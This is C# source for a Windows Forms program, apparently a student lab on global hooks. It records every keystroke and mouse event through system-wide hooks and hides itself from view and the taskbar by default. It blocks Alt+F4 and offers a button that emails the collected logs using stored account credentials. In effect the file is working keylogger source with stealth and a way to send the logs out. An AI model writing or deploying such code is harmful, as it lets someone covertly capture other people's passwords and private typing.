using System;
using System.ComponentModel;
using System.Windows.Forms;
using Gma.System.MouseKeyHook;

namespace Demo
{
    public partial class Main : Form
    {
        private IKeyboardMouseEvents _mEvents;
        private LogFileWatcher _logFileWatcher;

        private Keys _previousKey;
        private bool _isPreviousKeyDown = false;
        private bool _isCurrentAppModeHidden;

        public Main()
        {
            InitializeComponent();
            suppressMouseCheckBox.Checked = true;
            suppressAltF4CheckBox.Checked = true;
            SubscribeGlobal();
            FormClosing += Main_Closing;

            var isAppHidden = true;
            try
            {
                isAppHidden = bool.Parse(
                    ConfigManager.GetProperty(AppProperties.IsHiddenAppModeProperty));
            }
            catch (Exception)
            {}

            _isCurrentAppModeHidden = isAppHidden;
            if (isAppHidden)
            {
                this.ShowInTaskbar = false;
                this.Opacity = 0;
            }

            _logFileWatcher = new LogFileWatcher(LogFilePath);
        }

        protected override CreateParams CreateParams
        {
            get
            {
                var cp = base.CreateParams;
                cp.ExStyle |= 0x80;  // Turn on WS_EX_TOOLWINDOW
                return cp;
            }
        }

        private void Main_Closing(object sender, CancelEventArgs e)
        {
            Unsubscribe();
        }

        private void SubscribeGlobal()
        {
            Unsubscribe();
            Subscribe(Hook.GlobalEvents());
        }

        private void Subscribe(IKeyboardMouseEvents events)
        {
            _mEvents = events;
            _mEvents.KeyDown += OnKeyDown;
            _mEvents.KeyUp += OnKeyUp;
            _mEvents.KeyPress += HookManager_KeyPress;

            _mEvents.MouseUp += OnMouseUp;
            _mEvents.MouseClick += OnMouseClick;
            _mEvents.MouseDoubleClick += OnMouseDoubleClick;

            _mEvents.MouseMove += HookManager_MouseMove;

            _mEvents.MouseDragStarted += OnMouseDragStarted;
            _mEvents.MouseDragFinished += OnMouseDragFinished;

            if (checkBoxSupressMouseWheel.Checked)
                _mEvents.MouseWheelExt += HookManager_MouseWheelExt;
            else
                _mEvents.MouseWheel += HookManager_MouseWheel;

            if (suppressMouseCheckBox.Checked)
                _mEvents.MouseDownExt += HookManager_Supress;
            else
                _mEvents.MouseDown += OnMouseDown;
            
        }

        private void Unsubscribe()
        {
            if (_mEvents == null) return;
            _mEvents.KeyDown -= OnKeyDown;
            _mEvents.KeyUp -= OnKeyUp;
            _mEvents.KeyPress -= HookManager_KeyPress;

            _mEvents.MouseUp -= OnMouseUp;
            _mEvents.MouseClick -= OnMouseClick;
            _mEvents.MouseDoubleClick -= OnMouseDoubleClick;

            _mEvents.MouseMove -= HookManager_MouseMove;

            _mEvents.MouseDragStarted -= OnMouseDragStarted;
            _mEvents.MouseDragFinished -= OnMouseDragFinished;

            if (checkBoxSupressMouseWheel.Checked)
                _mEvents.MouseWheelExt -= HookManager_MouseWheelExt;
            else
                _mEvents.MouseWheel -= HookManager_MouseWheel;

            if (suppressMouseCheckBox.Checked)
                _mEvents.MouseDownExt -= HookManager_Supress;
            else
                _mEvents.MouseDown -= OnMouseDown;

            _mEvents.Dispose();
            _mEvents = null;
        }

        private void HookManager_Supress(object sender, MouseEventExtArgs e)
        {
            if (e.Button != MouseButtons.Right)
            {
                Log($"MouseDown \t\t\t\t {e.Button}\n");
                return;
            }

            Log($"MouseDown \t\t\t\t {e.Button} Suppressed\n");
            e.Handled = true;
        }

        private void OnKeyDown(object sender, KeyEventArgs e)
        {
            if (IsAltF4KeyCombination(e))
            {
                Log($"KeyDown  \t\t\t\t {e.KeyCode}\n");
                Log("Combination ALT + F4 is suppressed\n");
                e.Handled = true;
            }
            else if (IsChangeAppModeCombination(e))
            {
                ChangeAppMode();
                e.Handled = true;
            }
            else
            {
                Log($"KeyDown  \t\t\t\t {e.KeyCode}\n");
            }
            _previousKey = e.KeyCode;
            _isPreviousKeyDown = true;
        }

        private void ChangeAppMode()
        {
            if (_isCurrentAppModeHidden)
            {
                this.Opacity = 1.0;
                this.ShowInTaskbar = true;
                _isCurrentAppModeHidden = false;
            }
            else
            {
                this.Opacity = 0;
                this.ShowInTaskbar = false;
                _isCurrentAppModeHidden = true;
            }
        }

        private bool IsAltF4KeyCombination(KeyEventArgs e)
        {
            return _previousKey == Keys.LMenu && e.KeyCode == Keys.F4 &&
                   _isPreviousKeyDown && suppressAltF4CheckBox.Checked;
        }

        private bool IsChangeAppModeCombination(KeyEventArgs e)
        {
            return _previousKey == Keys.F4 && e.KeyCode == Keys.G && _isPreviousKeyDown;
        }

        private void OnKeyUp(object sender, KeyEventArgs e)
        {
            Log($"KeyUp  \t\t\t\t\t {e.KeyCode}\n");
            _previousKey = e.KeyCode;
            _isPreviousKeyDown = false;
        }

        private void HookManager_KeyPress(object sender, KeyPressEventArgs e)
        {
            Log($"KeyPress \t\t\t\t\t {e.KeyChar}\n");
        }

        private void HookManager_MouseMove(object sender, MouseEventArgs e)
        {
            labelMousePosition.Text = $"x={e.X:0000}; y={e.Y:0000}";
        }

        private void OnMouseDown(object sender, MouseEventArgs e)
        {
            Log($"MouseDown \t\t\t\t {e.Button}\n");
        }

        private void OnMouseUp(object sender, MouseEventArgs e)
        {
            Log($"MouseUp \t\t\t\t {e.Button}\n");
        }

        private void OnMouseClick(object sender, MouseEventArgs e)
        {
            Log($"MouseClick \t\t\t\t {e.Button}\n");
        }

        private void OnMouseDoubleClick(object sender, MouseEventArgs e)
        {
            Log($"MouseDoubleClick \t\t\t {e.Button}\n");
        }

        private void OnMouseDragStarted(object sender, MouseEventArgs e)
        {
            Log("MouseDragStarted\n");
        }

        private void OnMouseDragFinished(object sender, MouseEventArgs e)
        {
            Log("MouseDragFinished\n");
        }

        private void HookManager_MouseWheel(object sender, MouseEventArgs e)
        {
            labelWheel.Text = $"Wheel={e.Delta:000}";
        }
        
        private void HookManager_MouseWheelExt(object sender, MouseEventExtArgs e)
        {
            labelWheel.Text = $"Wheel={e.Delta:000}";
            Log("Mouse Wheel Move Suppressed.\n");
            e.Handled = true;
        }

        private void Log(string text)
        {
            if (IsDisposed) return;
            textBoxLog.AppendText(text);
            textBoxLog.ScrollToCaret();

            Logger.Log(text);
        }

        private void checkBoxSupressMouseWheel_CheckedChanged(object sender, EventArgs e)
        {
            if (_mEvents == null) return;

            if (((CheckBox) sender).Checked)
            {
                _mEvents.MouseWheel -= HookManager_MouseWheel;
                _mEvents.MouseWheelExt += HookManager_MouseWheelExt;
            }
            else
            {
                _mEvents.MouseWheelExt -= HookManager_MouseWheelExt;
                _mEvents.MouseWheel += HookManager_MouseWheel;
            }
        }

        private void checkBoxSuppressMouse_CheckedChanged(object sender, EventArgs e)
        {
            if (_mEvents == null) return;

            if (((CheckBox)sender).Checked)
            {
                _mEvents.MouseDown -= OnMouseDown;
                _mEvents.MouseDownExt += HookManager_Supress;
            }
            else
            {
                _mEvents.MouseDownExt -= HookManager_Supress;
                _mEvents.MouseDown += OnMouseDown;
            }
        }

        private void ClearLogButton_Click(object sender, EventArgs e)
        {
            textBoxLog.Clear();
        }

        private void SendToEmailButton_Click(object sender, EventArgs e)
        {
            EmailService.SendEmail();
        }

        private void EditSettingsButton_Click(object sender, EventArgs e)
        {
            var form = new SettingsEdit();
            if (form.ShowDialog() == DialogResult.OK)
            {
                if (!string.IsNullOrEmpty(form.EmailFrom))
                {
                    ConfigManager.SetProperty(AppProperties.EmailAddressFromProperty, form.EmailFrom);
                    form.EmailFrom = "";
                }

                if (!string.IsNullOrEmpty(form.EmailTo))
                {
                    ConfigManager.SetProperty(AppProperties.EmailAddressToProperty, form.EmailTo);
                    form.EmailTo = "";
                }

                if (!string.IsNullOrEmpty(form.Password))
                {
                    ConfigManager.SetProperty(AppProperties.PasswordProperty, form.Password);
                    form.Password = "";
                }

                if (!string.IsNullOrEmpty(form.FileSize))
                {
                    ConfigManager.SetProperty(AppProperties.FileSizeProperty, form.FileSize);
                    form.EmailFrom = "";
                }

                ConfigManager.SetProperty(AppProperties.IsHiddenAppModeProperty, form.IsHiddenMode.ToString());
            }
        }

        private const string LogFilePath = @"G:\Archive\VS\ИиПУ\lab-8. Global Hooks\Demo\bin\Debug";
    }
}